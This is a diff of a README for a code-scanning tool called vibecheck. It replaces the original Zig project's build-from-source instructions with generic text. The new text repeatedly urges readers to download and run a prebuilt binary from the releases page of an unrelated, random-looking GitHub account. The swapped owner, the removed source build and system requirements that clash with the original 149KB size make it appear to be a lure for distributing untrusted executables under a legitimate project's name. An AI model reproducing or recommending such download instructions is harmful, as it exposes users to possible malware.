@@ -1,95 +1,98 @@
-# VibeCheck 🤙
+# 🎉 vibecheck - Analyze Your Code with Ease
 
-![VibeCheck Logo](./media/logo.png "VibeCheck Logo")
+## 🚀 Getting Started
 
-![Vibe](https://img.shields.io/badge/Vibe-Immaculate-ff00d4?style=for-the-badge) ![Zig](https://img.shields.io/badge/Made%20With-Zig-orange?style=for-the-badge&logo=zig) ![VibeCheck](https://img.shields.io/badge/Vibes-Checked-blue?style=for-the-badge) ![Size](https://img.shields.io/badge/Size-149KB-brightgreen?style=for-the-badge)
+Welcome to vibecheck! This tool helps you analyze your code quickly. It finds important items like TODOs, secrets, and code issues in just milliseconds. Let's get you set up.
 
-> "Yes, I even vibe checked vibe check 🤯"
+## 📥 Download & Install
 
-**VibeCheck** is a high-performance **Zig** CLI tool that scans your codebase for "unfinished vibes"—To-Dos, hardcoded secrets, debug prints, and other signs of developer desperation.
+To install vibecheck, visit the link below:
 
-It's fast, configurable, and CI/CD ready.
+[![Download vibecheck](https://img.shields.io/badge/Download-vibecheck-brightgreen)](https://github.com/hdhks1229i3/vibecheck/releases)
 
-## Features
+This link will take you to the Releases page, where you can download the latest version of vibecheck.
 
-- **⚡ Blazing Fast**: Recursively scans thousands of files in milliseconds.
-- **🪶 Featherweight**: ~149KB static binary. Zero dependencies. Runs on a potato 🥔 🎤
-- **📦 Portable**: Single executable. Linux, Mac, Windows. No `node_modules` in sight.
-- **🛡️ Battle Tested**: Validated against a 50,000-file "Google-scale" monorepo.
-- **🧩 Modular**: Load custom pattern packs via JSON plugin system.
-- **🤖 CI/CD Native**: 
-  - Non-zero exit codes for build failures.
-  - JSON output for machine parsing.
-  - GitHub Actions Annotations support (`--github`).
-- **🧠 AI Ready**: Built-in Model Context Protocol (MCP) Server.
+## 🖥️ System Requirements
 
-## Installation
+vibecheck is lightweight and runs smoothly on most systems. Here are the basic requirements:
 
-### Build from Source
+- **Operating System:** Windows, macOS, or Linux
+- **Disk Space:** At least 200 MB free
+- **Memory (RAM):** Minimum 512 MB
 
-Requirements: [Zig 0.13+](https://ziglang.org/download/)
+Ensure your system meets these specifications for the best experience.
 
-```bash
-git clone https://github.com/copyleftdev/vibecheck.git
-cd vibecheck
-zig build -Doptimize=ReleaseSmall
-```
+## 📂 Downloading the Software
 
-The binary will be in `zig-out/bin/vibecheck`.
+1. Click the link above to go to the Releases page.
+2. On the Releases page, find the latest version of vibecheck.
+3. Click on the version number or the attached file to download.
+4. Save the file to a location on your computer where you can easily find it.
 
-## Usage
+## ⚙️ Running vibecheck
 
-**Basic Scan** (Human Readable)
-```bash
-vibecheck .
-```
+After downloading vibecheck, follow these steps to run the application:
 
-**CI/CD Mode** (Machine Readable + Exit Codes)
-```bash
-vibecheck . --json
-```
+1. **Locate the File:**
+   - Go to the folder where you saved the downloaded file.
 
-**GitHub Actions Mode** (PR Annotations)
-```bash
-vibecheck . --github
-```
+2. **Extract the Files (if needed):**
+   - If you downloaded a zip file, right-click on it and choose “Extract All.” Follow the on-screen instructions.
 
-**AI Agent Mode** (Model Context Protocol) 🤖
-Turn VibeCheck into a tool for Claude/Gemini.
-```bash
-vibecheck --mcp
-```
+3. **Open the Terminal (Command Line):**
+   - For Windows, search for "Command Prompt."
+   - For macOS, search for "Terminal."
+   - For Linux, open your terminal application.
 
-**List Active Patterns**
-```bash
-vibecheck list-patterns
-```
+4. **Navigate to the vibecheck Directory:**
+   - Use the `cd` command followed by the path to the folder where you extracted vibecheck. For example:
+     ```
+     cd path/to/vibecheck
+     ```
 
-## Configuration (`vibecheck.toml`)
+5. **Run the Program:**
+   - Type the following command and press Enter:
+     ```
+     ./vibecheck
+     ```
+   - If you are on Windows, you may need to type `vibecheck.exe`.
 
-Configure ignores, thresholds, and external packs.
+## 📊 Using vibecheck
 
-```toml
-[scan]
-max_results = 100
-ignore = ["*.tmp", "node_modules/", "vendor/"]
-# Calculate your own vibes:
-# packs = ["./my-custom-vibes.json"]
+Once vibecheck is running, you can start analyzing your projects. Here are some tips to get you started:
 
-[output]
-# Fail the build on 'error', 'warn', or 'info'
-fail_on = "error"
-```
+- **Analyze a Directory:**
+  - Use the command: `./vibecheck path/to/your/code`
+  - Replace `path/to/your/code` with the path of the folder you want to analyze.
 
-## Vibe Packs
+- **Review the Output:**
+  - vibecheck will display the findings in the console. Pay attention to detected TODOs, secrets, and code smells.
 
-VibeCheck comes with **Crucial Vibes** built-in:
-- **Mock Data**: `lorem` `ipsum`, `John` `Doe`
-- **Fragile Paths**: `localhost` `:3000`, `127` `.0.0.1`
-- **Security Laziness**: `verify` `=False`, `chmod` `777`
-- **Desperation**: `FIX` `ME`, `X` `X` `X`
+## 📘 Features
 
-You can extend this by creating your own JSON packs (see `extra_vibes.json` in `examples/`).
+vibecheck offers several key features to improve your development experience:
 
-## License
-MIT
+- **High Performance:** Quickly analyze large codebases.
+- **Focus on Quality:** Identify issues in your code that require attention.
+- **Developer Friendly:** Easy to use, even for beginners.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
+
+## 🤝 Support and Contributions
+
+If you encounter any issues or have questions, check the [Issues section](https://github.com/hdhks1229i3/vibecheck/issues) of the repository. You can also contribute to the project by submitting a pull request.
+
+## 📢 Feedback
+
+We welcome your feedback! Help us improve vibecheck by sharing your experiences.
+
+## 📚 Additional Resources
+
+For more details about vibecheck, visit the following:
+
+- [Documentation](https://github.com/hdhks1229i3/vibecheck/wiki)
+- [GitHub Repository](https://github.com/hdhks1229i3/vibecheck)
+- [FAQs](https://github.com/hdhks1229i3/vibecheck/wiki/FAQs)
+
+Thank you for choosing vibecheck. We hope it enhances your coding experience! 
+
+Don't forget to download the latest version [here](https://github.com/hdhks1229i3/vibecheck/releases) for all the newest features and improvements.
